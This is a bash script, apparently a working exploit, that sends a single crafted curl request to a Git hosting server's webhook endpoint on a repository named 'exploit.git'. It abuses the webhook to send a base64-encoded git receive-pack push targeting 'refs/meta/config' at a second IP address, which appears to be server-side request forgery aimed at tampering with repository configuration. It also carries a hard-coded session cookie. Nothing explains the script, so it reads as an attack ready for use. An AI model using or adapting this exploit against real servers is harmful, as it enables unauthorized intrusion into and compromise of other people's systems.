#!/bin/bash
curl 'http://35.209.38.120:1823/ape/exploit.git/webhooks' \
  -H 'Content-Type: application/json' \
  -H 'Cookie: user-token=7642b47b-77e3-4505-80d8-a5c890ddddaf' \
  --data-raw '{"url":"http://35.237.226.138/","body":"MDA5NDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAgNTc2ZTU0MDk5OGQ3NTJiZThhYTgwOWU3NGRhOGQyMDk5ZjNmMWIxYyByZWZzL21ldGEvY29uZmlnACByZXBvcnQtc3RhdHVzIHNpZGUtYmFuZC02NGsgYWdlbnQ9Z2l0LzIuMzAuMDAwMDBQQUNLAAAAAgAAAAPCmw54wpzCpcOMMQ7DgjAMQMORPcKnw7AFQGlqO8KJwoQQAxPCt0hiFyrCoEFpOnB7egfCpi/DvcOhw7XCpgoZM8Ohw4gpwqYUQsOxw4TDpFzCojhNwprCncK6w6zCghQJMXvDs0lNwpcOw4hqSQvDuTIgUsO0WcKSwpTCqcKIRxUREsKLw4zCrDrCmsK0w7VHbXDDk8Kdamtdw6A6L3c4w7XCr8OsdcOWw6LCpW7DvVXDq8OzWMOqw7sMAw/CjBQ8IRwsWmvDtsO7wp57w5c/CMKTRGBbwrXCmR9Qw5xHw5zCrAR4wpwzNDAwMzFRCHJ1dMOxdcOVw4tNYcOIw78twpM+w7nDkMO5w5obZ8K7w7LDtsOPTsOewrrDlMOtw68TQ8KIwqLDhMOkw6TDlMOiYsK9w6TDvMK8NMKGw7XCunUBMnrDlx1Ow5XClMO6w54owrTCtDDClsOww6oHAGgYHcOsNHjCnEssSMOlAgADwqwBQQ7CjScsK8K6F8O8fFwbwrkjPsOTwpVaAXXDnQ==","contentType":"application/x-git-receive-pack-request"}' \
  --compressed \
  --insecure

